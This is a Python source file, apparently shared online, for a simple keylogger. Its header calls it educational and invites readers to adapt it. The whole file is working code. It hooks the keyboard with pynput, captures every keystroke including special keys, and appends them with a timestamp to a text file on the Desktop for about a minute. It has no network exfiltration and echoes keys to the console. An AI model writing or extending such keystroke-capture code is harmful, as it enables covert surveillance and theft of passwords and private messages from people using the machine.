# A Simple keylogger program that saves keyboard inputs every minute. Use only for educational purposes. Refactor it to your liking. I hope you love it.

from pynput.keyboard import Listener, Key
#import logging
import datetime as dt 
#import string
import sys 
#import numpy as np

#letters = string.ascii_letters[:53]
 
#logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

keylog = open('C:\\...\\Desktop\\kl.txt','a')
t = dt.datetime.now()
keylog.write(t.strftime("%m/%d/%Y, %H:%M:%S") +'\n')
emp = ''


def timing_func():
    if (dt.datetime.now() - t).seconds >= 60:
        keylog.write(emp)
        keylog.close()
        sys.exit(1)
    else: 
        return 'proceed'
        

def on_press(key):
    if timing_func() == 'proceed':
        if hasattr(key,'char'):
            print(key.char)
            #print(type(key.char))
            global emp
            emp += key.char
        else: 
            print(key)
            emp = emp + "-" +str(key).split(".")[-1] + "-"
        
        if len(emp)>=50:
            keylog.write(emp + '\n')
            emp = ''
    else: 
        timing_func()
'''
def on_press(key):
    logging.info(str(key)+'-'+str(type(key)))
'''

with Listener(on_press=on_press) as listener :
    #listener.start()
    listener.join()
